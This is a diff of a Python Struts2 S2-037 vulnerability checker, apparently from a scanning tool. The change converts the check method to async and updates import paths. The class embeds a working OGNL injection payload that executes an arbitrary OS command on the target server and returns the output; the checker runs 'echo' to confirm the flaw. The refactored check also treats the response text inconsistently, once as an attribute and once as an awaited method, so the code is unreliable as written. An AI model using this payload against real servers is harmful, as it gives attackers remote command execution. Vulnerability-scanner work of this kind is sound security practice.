@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 
-from app.lib.utils.request import request
-from app.lib.utils.common import get_capta, get_useragent
+from app.lib.request import request
+from app.lib.common import get_capta, get_useragent
 
 class S2_037_BaseVerify:
     def __init__(self, url):
@@ -21,7 +21,7 @@ class S2_037_BaseVerify:
         }
         self.payload = '''/%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=7556&command='''
     
-    def check(self):
+    async def check(self):
 
         """
         检测是否存在漏洞
@@ -32,15 +32,12 @@ class S2_037_BaseVerify:
         """
 
         try:
-            check_req = request.get(self.url + self.payload + 'echo ' + self.capta, headers = self.headers)
-            if self.capta in check_req.text and len(check_req.text) < 100:
+            check_req = await request.get(self.url + self.payload + 'echo ' + self.capta, headers = self.headers)
+            if self.capta in check_req.text and len(await check_req.text()) < 100:
                 return True
-            else:
-                return False
+            
         except Exception as e:
-            print(e)
-            return False
-        finally:
+            # print(e)
             pass
 
 if  __name__ == "__main__":
